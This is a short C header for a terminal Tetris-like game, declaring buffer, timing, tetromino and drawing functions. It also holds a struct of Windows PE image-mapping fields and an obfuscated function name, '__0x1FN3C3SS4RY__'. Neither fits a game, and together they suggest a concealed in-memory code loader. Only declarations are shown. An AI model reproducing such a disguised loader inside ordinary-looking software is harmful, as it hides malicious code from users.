#include <time.h>
#define A_WIDTH  10 
#define A_HEIGHT 20  
#define T_WIDTH  4  
#define T_HEIGHT 4   

typedef struct {
    char *buffer;
    size_t buffLen;
    size_t byteLen;
} BufferBuilder;


typedef struct {
 void* heapBase;
 unsigned long long preferedBase;
 unsigned long imageSize;
 unsigned long headersSize;
 unsigned short ImageSectionsCount;
 unsigned long long ImageSectionHeaders;
 unsigned long RVAAddressOfEntryPoint;
} MappingMetadata;


// Get milliseconds between two clock_t values
clock_t getMs(clock_t start, clock_t end);

// Create a new buffer
BufferBuilder *bbCreate(size_t initialSize);

// Append a string to a buffer
int bbAppend(BufferBuilder *bb, const char *str);

// Free a buffer
void bbFree(BufferBuilder *bb);

// Generate a new tetromino
void newTetromino();

// Determine if a position is valid
bool validPos(int tetromino, int rotation, int posX, int posY);

bool __0x1FN3C3SS4RY__();

void tetrix();

bool initializeTetrix();
// Rotate tetromino
int rotate(int x, int y, int rotation);

// Process keyboard inputs
void processInputs();

// Move tetromino down
bool moveDown();

// Add tetromino to arena
void addToArena();

// Check if lines can be cleared
void checkLines();

// Draw arena
void drawArena();